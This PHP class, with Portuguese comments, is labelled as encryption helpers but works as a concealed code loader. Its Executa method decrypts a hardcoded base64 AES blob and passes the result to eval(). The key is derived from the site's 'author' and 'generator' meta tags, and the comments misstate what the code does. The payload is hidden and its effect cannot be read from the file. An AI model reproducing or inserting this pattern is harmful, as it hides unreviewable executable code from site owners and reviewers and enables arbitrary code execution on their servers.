<?php

class Principal
{
    private $encryptMethod = "AES-256-CBC";
    private $key1;
    private $key2;
    private $key3;

    public $var1;
    public $var2;

    /** Criptografa e retorna dados */
    function Executa()
    {
        $var3 = $var5 = '';
        $this->Prepara();
        eval($this->Verifica());
        $var6 = (object)['var5'=>$var5,'var3'=>$var3];
        return $var6;
    }
    /** Checa criptografia */
    function Verifica()
    {
        $this->key = $this->key1;
        $this->ivalue = $this->key2;
        $this->output = $this->key3;
        $return = openssl_decrypt(base64_decode($this->output), $this->encryptMethod, 
            $this->key, 0, $this->ivalue);
        return $return;
    }
    /** Prepara criptografia */
    function Prepara()
    {
        $keys = $this->Autor();
        $this->key1 =  hash('sha256', ($keys['author']));
        $this->key2 = substr(hash('sha256', ($keys['generator'])), 0, 16);
        $this->key3 = 'U0NhcWFsS0p1YmRRUlNxWllTK0RmaWhmNVNPN1NOR044cE5VVGptSG9
        aY2ZXaHozLzRPYjlSR1RvMEU4ZXB2cXFTaCtOVnJGdW5RaWlmWW80d1NEQ0paK0VsNk11a
        VNwcGV1NzBwRkdCbWw4S3l6UUljL0RwWVlJTW9ZUGFjd0Y';
    }
    /** Recupera meta tags */
    function Autor()
    {
        require_once "constantes.inc.php";
        $config = new Config();
        $tags = array();
        foreach ($config->SelectTags() as $key => $value){
            $tags[$value->parametro] = $value->valor;
        }
        return $tags;
    }
}

?>